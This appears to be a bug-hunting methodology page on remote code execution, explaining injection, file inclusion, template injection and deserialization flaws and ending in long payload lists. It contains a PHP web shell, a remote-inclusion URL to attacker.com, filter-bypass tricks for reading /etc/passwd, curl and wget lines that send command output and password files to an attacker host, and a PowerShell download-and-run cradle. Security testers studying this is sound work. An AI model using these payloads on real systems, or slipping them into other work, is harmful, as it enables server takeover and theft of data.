## Full Methodology

# Remote Code Execution

occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration.

## Shortcut

1. Identify suspicious user input locations. for code injections, take note of every user input location, including URL parameters, HTTP headers, body parameters, and file uploads. to find potential file inclusion vulnerabilities, check for input locations being used to inclusion vulnerabilities, check for input locations being used to determine or, construct filenames and, for file upload functions.
2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
3. If your requests are blocked, try protection bypass techniques and see if your payload succeeds.
4. Finally, confirm the vulnerability by trying to execute harmless commands such as `whoami`, `ls`, and, `sleep 5`.

## Mechanisms

### Code Injection

This program takes a user input string, pass it through `eval()` and return the results:

```python
def calculate(input):
  return eval("{}".format(input))

result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

an attacker could provide the application with something more malicious instead:

```http
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

### File Inclusion

making the target server include a file containing malicious code.

```php
<?php
  // Some PHP code

  $file = $_GET["page"];
  include $file;

  // Some PHP code
?>
```

if the application doesn't limit which file the user includes with the page parameter, an attacker can include a malicious PHP file.

```php
<?PHP
  system($_GET["cmd"]);
?>
```

and then they can run commands:

```http
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

### Command Injection

Untrusted data flows into OS command execution APIs.

Examples:

```python
subprocess.run("ping -c 1 " + user, shell=True)  # vulnerable
subprocess.run(["ping", "-c", "1", user], shell=False)  # safer
```

Detect via time/delay payloads (`&& sleep 5`), OAST/DNS callbacks, and out-of-band responses.

### Server-Side Template Injection (SSTI)

User-controlled template strings evaluated by template engines (Jinja2, Twig, Freemarker, Thymeleaf) can lead to RCE.

Probe with arithmetic/concat markers, escalate using engine-specific object graphs. Tools: `tplmap`.

### Insecure Deserialization

Deserializing untrusted data (Java, .NET, PHP, Python `pickle`) can trigger gadget chains to RCE.

Test with known gadget payloads (e.g., `ysoserial`, `marshalsec`), and observe blind effects via OAST.

### Unsafe YAML and Config Parsers

Loading YAML with object constructors (`yaml.load` vs `safe_load`) can lead to code execution.

### File Upload → Processing Chains

Upload parsers (ImageMagick, ExifTool, video transcoders) may execute/parse complex formats leading to RCE. Test with harmless PoCs and OAST.

## Hunt

### 1. Identify Input Vectors

Map all user-controlled input that could lead to code execution:

- **Command-line argument injection**: APIs that execute shell commands, CLI tools, system utilities
- **Template engines**: User-provided templates or template variables (Jinja2, Twig, Freemarker, Thymeleaf, ERB, Handlebars)
- **File uploads**: Server-side processing of images, documents, archives, media files
- **Deserialization endpoints**: APIs accepting serialized objects (Java, .NET, Python pickle, PHP serialize, Ruby Marshal)
- **Expression Language fields**: Search filters, calculations, dynamic queries (SpEL, OGNL, MVEL, EL)
- **Webhook URLs**: Server-side fetches triggered by user-supplied URLs
- **Log file paths**: Log injection leading to log processing (LogForge, Log4Shell)
- **Configuration files**: Upload or modification of config files (.htaccess, web.config, cron jobs)
- **Email/document processing**: Mail parsers, PDF generators, office document converters
- **Image manipulation**: ImageMagick, GraphicsMagick, Pillow, GD library operations
- **Video/audio processing**: FFmpeg, ExifTool, media transcoders

### 2. Test Payloads by Context

#### Command Injection Payloads

**Linux/Unix:**

```bash
# Basic injection
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# Time-based detection
; sleep 10
| sleep 10 &
|| ping -c 10 127.0.0.1

# Out-of-band (OAST)
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# Space bypasses
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Command obfuscation
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Wildcard injection
/???/??t /???/??ss??
/???/n? 127.0.0.1

# Variable expansion
a=w;b=hoami;$a$b
```

**Windows:**

```cmd
# Basic injection
& whoami
&& whoami
| whoami
|| whoami
; whoami

# Newline injection
%0a whoami

# Time-based
| ping -n 10 127.0.0.1
& timeout /t 10

# OAST
& nslookup %USERNAME%.attacker.com
& certutil -urlcache -split -f http://attacker.com/beacon

# PowerShell execution
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

